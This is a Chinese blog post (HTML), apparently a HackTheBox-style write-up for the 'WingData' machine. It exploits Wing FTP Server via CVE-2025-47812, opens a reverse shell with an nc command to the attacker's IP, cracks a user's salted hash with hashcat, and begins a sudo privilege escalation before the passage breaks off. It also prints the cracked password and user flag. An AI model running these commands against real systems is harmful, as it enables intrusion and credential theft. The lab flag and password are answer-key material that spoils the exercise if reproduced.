@@ -1,0 +1,1084 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Suzen.jpg">
+  <link rel="icon" href="/img/Suzen.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="Suzen">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="USER FLAGnmap 扫一下靶机的端口服务 1nmap -A 10.129.19.187  22 端口的 SSH，还有 80 的 Web  先看 80 的，无法重定向到http:&#x2F;&#x2F;wingdata.htb&#x2F;，需要设置一下&#x2F;etc&#x2F;hosts 110.129.19.187 wingdata.htb   浏览器访问，成功重定向  dirsearch 扫目录没扫到有用的路径 就去页面中找找利用点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WingData">
+<meta property="og:url" content="https://yschen20.github.io/2026/04/08/WingData/index.html">
+<meta property="og:site_name" content="Suzen">
+<meta property="og:description" content="USER FLAGnmap 扫一下靶机的端口服务 1nmap -A 10.129.19.187  22 端口的 SSH，还有 80 的 Web  先看 80 的，无法重定向到http:&#x2F;&#x2F;wingdata.htb&#x2F;，需要设置一下&#x2F;etc&#x2F;hosts 110.129.19.187 wingdata.htb   浏览器访问，成功重定向  dirsearch 扫目录没扫到有用的路径 就去页面中找找利用点">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408141636592.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408141746347.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408141807971.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408185320667.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408185702275.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408185758674.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408190423449.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408190541599.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408190817750.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408190928358.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408191020843.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408191325267.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408192659099.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408192721931.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408194502054.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408194613949.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408194701348.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408194803024.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408195627425.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408195835740.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408195911344.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408200039290.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408204925873.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408211826029.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408212118071.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408210930394.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408211019841.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408212309580.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408212329276.png">
+<meta property="article:published_time" content="2026-04-08T13:27:06.000Z">
+<meta property="article:modified_time" content="2026-04-08T13:27:33.415Z">
+<meta property="article:author" content="Suzen">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60408141636592.png">
+<meta name="twitter:creator" content="@Suzen">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>WingData - Suzen</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassbg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yschen20.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-04-25T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+
+    
+
+<style type="text/css">
+  @keyframes spin3D {
+    from {
+      transform: rotate3d(0.5, 0.5, 0.5, 360deg);
+    }
+
+    to {
+      transform: rotate3d(0deg);
+    }
+  }
+
+  #loading {
+    height: 100%;
+    background-color: #172d4781;
+    backdrop-filter: saturate(100%) blur(10px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    overflow: hidden;
+    z-index: 99999999;
+  }
+
+  .spinner-box {
+    width: 300px;
+    height: 300px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: transparent;
+  }
+
+  .leo {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-radius: 50%;
+  }
+
+  .blue-orbit {
+    width: 175px;
+    height: 175px;
+    border: 2px solid #1a91fa;
+    animation: spin3D 3s linear .2s infinite;
+  }
+
+  .green-orbit {
+    width: 135px;
+    height: 135px;
+    border: 2px solid #00ffdd;
+    animation: spin3D 2s linear 0s infinite;
+  }
+
+  .red-orbit {
+    width: 100px;
+    height: 100px;
+    border: 2px solid #d75151;
+    animation: spin3D 1s linear 0s infinite;
+  }
+
+  .white-orbit-a {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 3s linear 0s infinite;
+  }
+
+  .white-orbit-b {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 1.5s linear 0s infinite;
+  }
+
+  .nucleus {
+    width: 1px;
+    height: 1px;
+    border: 1px solid #ffffff;
+    animation: spin3D 1s linear 0s infinite;
+  }
+</style>
+
+<div id="loading">
+    <div class="spinner-box">
+        <div class="blue-orbit leo"></div>
+        <div class="green-orbit leo"></div>
+        <div class="red-orbit leo"></div>
+        <div class="white-orbit-a leo"></div>
+        <div class="white-orbit-b leo"></div>
+        <div class="nucleus leo"></div>
+    </div>
+</div>
+
+<script>
+  (function () {
+    const loaded = function () {
+      window.onload = function () {
+        const loader = document.getElementById("loading");
+        loader.className = "fadeout";
+        setTimeout(function () {
+            loader.style.display = "none";
+          },
+                500
+        );
+      }
+    };
+    loaded();
+  })();
+</script>
+
+
+
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Suzen的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/2.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="WingData"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Suzen
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-08 21:27" pubdate>
+          2026年4月8日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          900 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          8 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">WingData</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2026-04-08T21:27:33+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="USER-FLAG"><a href="#USER-FLAG" class="headerlink" title="USER FLAG"></a>USER FLAG</h1><p>nmap 扫一下靶机的端口服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 10.129.19.187<br></code></pre></td></tr></table></figure>
+
+<p>22 端口的 SSH，还有 80 的 Web</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408141636592.png" srcset="/img/loading.gif" lazyload alt="image-20260408141636592"></p>
+<p>先看 80 的，无法重定向到<code>http://wingdata.htb/</code>，需要设置一下<code>/etc/hosts</code></p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.129.19.187</span> wingdata.htb<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408141746347.png" srcset="/img/loading.gif" lazyload alt="image-20260408141746347"></p>
+<p>浏览器访问，成功重定向</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408141807971.png" srcset="/img/loading.gif" lazyload alt="image-20260408141807971"></p>
+<p>dirsearch 扫目录没扫到有用的路径</p>
+<p>就去页面中找找利用点，有个可能的利用点就是下面这个发消息的，不过测试发现没什么用</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408185320667.png" srcset="/img/loading.gif" lazyload alt="image-20260408185320667"></p>
+<p>还有一个就是导航栏里的 “Client Portal”</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408185702275.png" srcset="/img/loading.gif" lazyload alt="image-20260408185702275"></p>
+<p>点击后会跳转到子域名<code>http://ftp.wingdata.htb/</code></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408185758674.png" srcset="/img/loading.gif" lazyload alt="image-20260408185758674"></p>
+<p>连接一下这个FTP服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp ftp.wingdata.htb<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408190423449.png" srcset="/img/loading.gif" lazyload alt="image-20260408190423449"></p>
+<p>要配置一下<code>/etc/hosts</code></p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.129.19.187</span> wingdata.htb ftp.wingdata.htb<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408190541599.png" srcset="/img/loading.gif" lazyload alt="image-20260408190541599"></p>
+<p>然后就可以访问到了</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408190817750.png" srcset="/img/loading.gif" lazyload alt="image-20260408190817750"></p>
+<p>可以看到是 Wing FTP Server v7.4.3</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408190928358.png" srcset="/img/loading.gif" lazyload alt="image-20260408190928358"></p>
+<p>找一下有没有历史漏洞和POC，可以找到：CVE-2025-47812</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408191020843.png" srcset="/img/loading.gif" lazyload alt="image-20260408191020843"></p>
+<p>POC：<a target="_blank" rel="noopener" href="https://github.com/r0otk3r/CVE-2025-47812">https://github.com/r0otk3r/CVE-2025-47812</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python CVE-2025-47812.py -u <span class="hljs-string">&quot;http://ftp.wingdata.htb/&quot;</span> -U anonymous -P password -c <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>成功执行</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408191325267.png" srcset="/img/loading.gif" lazyload alt="image-20260408191325267"></p>
+<p>反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python CVE-2025-47812.py -u <span class="hljs-string">&quot;http://ftp.wingdata.htb/&quot;</span> -U anonymous -P password -c <span class="hljs-string">&quot;nc 10.10.16.44 2333 -e /bin/bash&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408192659099.png" srcset="/img/loading.gif" lazyload alt="image-20260408192659099"></p>
+<p>生成交互式shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/bin/script -qc /bin/bash /dev/null<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408192721931.png" srcset="/img/loading.gif" lazyload alt="image-20260408192721931"></p>
+<p>有一个<code>wacky</code>用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /home<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408194502054.png" srcset="/img/loading.gif" lazyload alt="image-20260408194502054"></p>
+<p>在<code>/opt/wftpserver/Data/1/users</code>中可以得到用户凭证</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408194613949.png" srcset="/img/loading.gif" lazyload alt="image-20260408194613949"></p>
+<p>其中有哈希密码</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408194701348.png" srcset="/img/loading.gif" lazyload alt="image-20260408194701348"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">32940</span>defd<span class="hljs-number">3</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>ef<span class="hljs-number">70</span>a<span class="hljs-number">2</span>dd<span class="hljs-number">44</span>a<span class="hljs-number">5301</span>ff<span class="hljs-number">984</span><span class="hljs-keyword">c</span><span class="hljs-number">4742</span>f<span class="hljs-number">0</span>baae<span class="hljs-number">76</span>ff<span class="hljs-number">5</span>b<span class="hljs-number">8783994</span>f<span class="hljs-number">8</span>a<span class="hljs-number">503</span>ca<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408194803024.png" srcset="/img/loading.gif" lazyload alt="image-20260408194803024"></p>
+<p>WingFTP的盐值是：<code>WingFTP</code></p>
+<p>用 hashcat 爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -m 1410 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>
+
+<p>成功爆破出密码：<code>!#7Blushing^*Bride5</code>（不太好找，慢慢翻一翻）</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408195627425.png" srcset="/img/loading.gif" lazyload alt="image-20260408195627425"></p>
+<p>然后 SSH 连接登录 wacky 用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh wacky@10.129.19.187<br></code></pre></td></tr></table></figure>
+
+<p>成功登录</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408195835740.png" srcset="/img/loading.gif" lazyload alt="image-20260408195835740"></p>
+<p>USER FLAG 就在用户目录下</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408195911344.png" srcset="/img/loading.gif" lazyload alt="image-20260408195911344"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">5b3129123774a94cb69cb996475d86bb<br></code></pre></td></tr></table></figure>
+
+<h1 id="ROOT-FLAG"><a href="#ROOT-FLAG" class="headerlink" title="ROOT FLAG"></a>ROOT FLAG</h1><p>继续寻找提权方法，可以找到 sudo 权限配置缺陷导致的可以无密码以 root 身份执行<code>/usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60408200039290.png" srcset="/img/loading.gif" lazyload alt="image-20260408200039290"></p>
+<p>看一下<code>/opt/backup_clients/restore_backup_clients.py</code>这个脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /opt/backup_clients/restore_backup_clients.py<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> argparse<br><br>BACKUP_BASE_DIR = <span class="hljs-string">&quot;/opt/backup_clients/backups&quot;</span><br>STAGING_BASE = <span class="hljs-string">&quot;/opt/backup_clients/restored_backups&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_backup_name</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.fullmatch(<span class="hljs-string">r&quot;^backup_\d+\.tar$&quot;</span>, filename):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    client_id = filename.split(<span class="hljs-string">&#x27;_&#x27;</span>)[<span class="hljs-number">1</span>].rstrip(<span class="hljs-string">&#x27;.tar&#x27;</span>)<br>    <span class="hljs-keyword">return</span> client_id.isdigit() <span class="hljs-keyword">and</span> client_id != <span class="hljs-string">&quot;0&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_restore_tag</span>(<span class="hljs-params">tag</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(re.fullmatch(<span class="hljs-string">r&quot;^[a-zA-Z0-9_]&#123;1,24&#125;$&quot;</span>, tag))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = argparse.ArgumentParser(<br>        description=<span class="hljs-string">&quot;Restore client configuration from a validated backup tarball.&quot;</span>,<br>        epilog=<span class="hljs-string">&quot;Example: sudo %(prog)s -b backup_1001.tar -r restore_john&quot;</span><br>    )<br>    parser.add_argument(<br>        <span class="hljs-string">&quot;-b&quot;</span>, <span class="hljs-string">&quot;--backup&quot;</span>,<br>        required=<span class="hljs-literal">True</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, &quot;</span><br>             <span class="hljs-string">&quot;where &lt;client_id&gt; is a positive integer, e.g., backup_1001.tar)&quot;</span><br>    )<br>    parser.add_argument(<br>        <span class="hljs-string">&quot;-r&quot;</span>, <span class="hljs-string">&quot;--restore-dir&quot;</span>,<br>        required=<span class="hljs-literal">True</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Staging directory name for the restore operation. &quot;</span><br>             <span class="hljs-string">&quot;Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). &quot;</span><br>             <span class="hljs-string">&quot;Only alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1–24 characters).&quot;</span><br>    )<br><br>    args = parser.parse_args()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> validate_backup_name(args.backup):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] Invalid backup name. Expected format: backup_&lt;client_id&gt;.tar (e.g., backup_1001.tar)&quot;</span>, file=sys.stderr)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(backup_path):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] Backup file not found: <span class="hljs-subst">&#123;backup_path&#125;</span>&quot;</span>, file=sys.stderr)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args.restore_dir.startswith(<span class="hljs-string">&quot;restore_&quot;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] --restore-dir must start with &#x27;restore_&#x27;&quot;</span>, file=sys.stderr)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    tag = args.restore_dir[<span class="hljs-number">8</span>:]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> tag:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] --restore-dir must include a non-empty tag after &#x27;restore_&#x27;&quot;</span>, file=sys.stderr)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> validate_restore_tag(tag):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores&quot;</span>, file=sys.stderr)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Backup: <span class="hljs-subst">&#123;args.backup&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Staging directory: <span 